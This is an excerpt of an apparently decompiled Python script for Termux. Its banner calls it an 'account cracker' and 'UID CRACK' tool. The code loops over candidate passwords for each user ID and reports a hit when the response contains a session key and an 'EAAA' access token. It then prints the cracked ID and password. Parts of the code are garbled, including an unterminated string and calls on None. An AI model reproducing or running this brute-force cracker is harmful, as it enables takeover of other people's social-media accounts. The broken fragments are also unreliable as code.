...
def main_apv():
    ...
    r1 = None if IOError else requests.get('https://youtube.com/@mkgamingff300').text
    if key1 in r1:
        Main()
        return None
    None.system('clear')
    ...
    print(' [+] Token : ')
    time.sleep(3.5)
    tks = ' [] Login Successful
    os.system('am start https://youtube.com/@termuxmasud-tech' + tks)
...
└─────────────────────────────────────────────────────┘\n\n   \x1b[1;92m 
┌─────────────────────────────────────────────────────┐\n   \x1b[1;92m 
│ \x1b[1;91m[\x1b[1;92m+\x1b[1;91m]
    \x1b[1;92m2009 JUST NOW LOG INABLE ACCOUNT CRACKER\x1b
 [1;91m[\x1b[1;92m+\x1b[1;91m]   
 \x1b[1;92m│\n   \x1b[1;92m 
└─────────────────────────────────────────────────────┘\n\n\x1b[1;92m    
┌─────────────────────────────────────────────────────┐\n\x1b[1;92m    
│[\x1b[1;91m✔\x1b[1;92m] 
  DEVELOPER  :            SK Morshed            │\n\x1b[1;92m    │[\x1b[1;91m✔\x1b[1;92m]
  FACEBOOK    :            SK Morshed      │\n\x1b[1;92m    │[\x1b[1;91m✔\x1b[1;92m]
  GITHUB          :           BLACK-GAMING-YT        │\n\x1b[1;92m    │[\x1b[1;91m✔\x1b[1;92m] 
  WHATSAPP   :           +8801309212152      │\n\x1b[1;92m    │[\x1b[1;91m✔\x1b[1;92m] 
  TOOLS            :           UID CRACK                   │\n \x1b[1;92m   
└─────────────────────────────────────────────────────┘'
...
class Main:
    ...
    def __init__(self):
        ...
        if KHALID in ('1', '01'):
            self.old()
        if KHALID in ('2', '02'):
            os.system('xdg-open https://youtube.com/@mkgamingff300')
            Main()
        if KHALID in ('3', '03'):
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write('\r [MASUD] %s/%s -> OK:-%s - CP:-%s ' % (self.loop, len(self.id), len(self.cp), len(self.ok)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                print('\r \x1b[0;92m[MASUD-SUCCESSFUL] %s ✔ %s\x1b[0;97m         ' % (uid, pw))
